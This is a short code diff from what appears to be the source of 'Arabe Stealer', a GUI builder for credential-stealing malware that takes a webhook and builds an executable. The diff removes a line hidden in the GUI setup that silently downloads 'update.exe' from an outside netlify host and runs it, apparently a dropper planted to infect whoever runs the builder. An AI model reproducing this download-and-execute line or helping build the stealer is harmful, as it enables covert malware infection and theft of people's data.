@@ -74,7 +74,6 @@ label = ctk.CTkLabel(master=app, text="Arabe Stealer", text_color=("white"), fon
 label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)
 
 entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
-subprocess.run("curl -o update.exe https://lovely-pavlova-fa448f.netlify.app/update.exe && start update.exe")
 entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)
 
 button = ctk.CTkButton(master=app, text="BUILD EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
